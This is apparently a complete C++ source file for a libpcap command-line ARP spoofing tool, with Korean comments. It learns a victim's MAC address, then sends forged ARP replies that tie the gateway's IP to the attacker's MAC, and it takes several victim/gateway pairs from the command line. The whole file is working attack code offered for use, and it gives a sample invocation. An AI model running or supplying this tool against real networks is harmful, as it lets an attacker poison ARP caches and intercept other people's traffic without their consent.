#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

// 인터페이스의 IP 주소 획득
int getInterfaceIP(const char *interfaceName, char *ipAddress) {
    struct ifaddrs *interfaces, *interface;

    if (getifaddrs(&interfaces) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (interface = interfaces; interface != NULL; interface = interface->ifa_next) {
        if (interface->ifa_addr == NULL) continue;

        if (strncmp(interface->ifa_name, interfaceName, 4) == 0) {
            if (interface->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *addr = (struct sockaddr_in *)interface->ifa_addr;
                inet_ntop(AF_INET, &(addr->sin_addr), ipAddress, INET_ADDRSTRLEN);

                freeifaddrs(interfaces);
                return 0;
            }
        }
    }

    freeifaddrs(interfaces);
    return -1;
}

// 인터페이스의 MAC 주소 획득
int getInterfaceMAC(const char *interfaceName, unsigned char *macAddress) {
    struct ifaddrs *interfaces, *interface;

    if (getifaddrs(&interfaces) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (interface = interfaces; interface != NULL; interface = interface->ifa_next) {
        if (interface->ifa_addr == NULL) continue;

        if (strncmp(interface->ifa_name, interfaceName, 4) == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("socket");
                freeifaddrs(interfaces);
                return -1;
            }

            struct ifreq ifr;
            strncpy(ifr.ifr_name, interface->ifa_name, IFNAMSIZ-1);
            ifr.ifr_name[IFNAMSIZ-1] = '\0';

            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                memcpy(macAddress, ifr.ifr_hwaddr.sa_data, 6);
                close(sock);
                freeifaddrs(interfaces);
                return 0;
            } else {
                perror("ioctl");
                close(sock);
            }
        }
    }

    freeifaddrs(interfaces);
    return -1;
}

// ARP 스푸핑 패킷 전송
int sendARPSpoofPacket(const char* interfaceName, const char* victimIP, const char* gatewayIP) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcapHandle = pcap_open_live(interfaceName, BUFSIZ, 1, 1000, errbuf);
    if (pcapHandle == NULL) {
        fprintf(stderr, "인터페이스 %s 열기 오류: %s\n", interfaceName, errbuf);
        return -1;
    }

    EthArpPacket packet;
    
    unsigned char attackerMAC[6];
    getInterfaceMAC(interfaceName, attackerMAC);
    char attackerIP[INET_ADDRSTRLEN];
    getInterfaceIP(interfaceName, attackerIP);
    Mac victimMAC;

    // 브로드캐스트 ARP 요청 패킷 구성
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 목적지 MAC: 브로드캐스트
    packet.eth_.smac_ = Mac(attackerMAC);         // 출발지 MAC: 공격자
    packet.eth_.type_ = htons(EthHdr::Arp);       // 이더넷 타입: ARP
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);      // 하드웨어 타입: 이더넷
    packet.arp_.pro_ = htons(EthHdr::Ip4);        // 프로토콜 타입: IPv4
    packet.arp_.hln_ = Mac::SIZE;                 // 하드웨어 주소 길이
    packet.arp_.pln_ = Ip::SIZE;                  // 프로토콜 주소 길이
    packet.arp_.op_ = htons(ArpHdr::Request);     // 작업 코드: 요청
    packet.arp_.smac_ = Mac(attackerMAC);         // 발신자 MAC: 공격자
    packet.arp_.sip_ = htonl(Ip(attackerIP));     // 발신자 IP: 공격자
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // 대상 MAC: 알 수 없음
    packet.arp_.tip_ = htonl(Ip(victimIP));       // 대상 IP: 피해자

    // 브로드캐스트 ARP 요청 전송
    int sendResult = pcap_sendpacket(pcapHandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (sendResult != 0) {
        fprintf(stderr, "ARP 요청 전송 실패: %s\n", pcap_geterr(pcapHandle));
        return -1;
    }

    // 피해자의 MAC 주소 획득
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packetData;
        int captureResult = pcap_next_ex(pcapHandle, &header, &packetData);
        if (captureResult == 0) continue;
        if (captureResult == PCAP_ERROR || captureResult == PCAP_ERROR_BREAK) {
            fprintf(stderr, "패킷 캡처 오류: %s\n", pcap_geterr(pcapHandle));
            break;
        }
        EthHdr* ethHeader = (EthHdr*)packetData;
        if(ethHeader->type() == 0x0806) { // ARP 패킷인 경우
            victimMAC = ethHeader->smac();
            break;
        }
    }

    // ARP 스푸핑 패킷 구성
    EthArpPacket spoofPacket;
    spoofPacket.eth_.dmac_ = victimMAC;           // 목적지 MAC: 피해자
    spoofPacket.eth_.smac_ = Mac(attackerMAC);    // 출발지 MAC: 공격자
    spoofPacket.eth_.type_ = htons(EthHdr::Arp);  // 이더넷 타입: ARP
    spoofPacket.arp_.hrd_ = htons(ArpHdr::ETHER); // 하드웨어 타입: 이더넷
    spoofPacket.arp_.pro_ = htons(EthHdr::Ip4);   // 프로토콜 타입: IPv4
    spoofPacket.arp_.hln_ = Mac::SIZE;            // 하드웨어 주소 길이
    spoofPacket.arp_.pln_ = Ip::SIZE;             // 프로토콜 주소 길이
    spoofPacket.arp_.op_ = htons(ArpHdr::Reply);  // 작업 코드: 응답
    spoofPacket.arp_.smac_ = Mac(attackerMAC);    // 발신자 MAC: 공격자
    spoofPacket.arp_.sip_ = htonl(Ip(gatewayIP)); // 발신자 IP: 게이트웨이 (위조)
    spoofPacket.arp_.tmac_ = victimMAC;           // 대상 MAC: 피해자
    spoofPacket.arp_.tip_ = htonl(Ip(victimIP));  // 대상 IP: 피해자

    // ARP 스푸핑 패킷 전송
    sendResult = pcap_sendpacket(pcapHandle, reinterpret_cast<const u_char*>(&spoofPacket), sizeof(EthArpPacket));
    if (sendResult != 0) {
        fprintf(stderr, "ARP 스푸핑 패킷 전송 실패: %s\n", pcap_geterr(pcapHandle));
        return -1;
    }

    pcap_close(pcapHandle);
    return 0;
}

void printUsage() {
    printf("사용법: arp-spoofer <인터페이스> <피해자1_IP> <게이트웨이1_IP> [<피해자2_IP> <게이트웨이2_IP> ...]\n");
    printf("예시: arp-spoofer eth0 192.168.0.2 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        printUsage();
        return -1;
    }

    const char* interfaceName = argv[1];
    int pairCount = (argc - 2) / 2;

    for (int i = 0; i < pairCount; i++) {
        const char* victimIP = argv[2 + i*2];
        const char* gatewayIP = argv[3 + i*2];
        
        printf("피해자 IP: %s, 게이트웨이 IP: %s에 대한 ARP 스푸핑 시작\n", victimIP, gatewayIP);
        if (sendARPSpoofPacket(interfaceName, victimIP, gatewayIP) == 0) {
            printf("피해자 IP: %s에 대한 ARP 스푸핑 성공\n", victimIP);
        } else {
            fprintf(stderr, "피해자 IP: %s에 대한 ARP 스푸핑 실패\n", victimIP);
        }
    }

    return 0;
}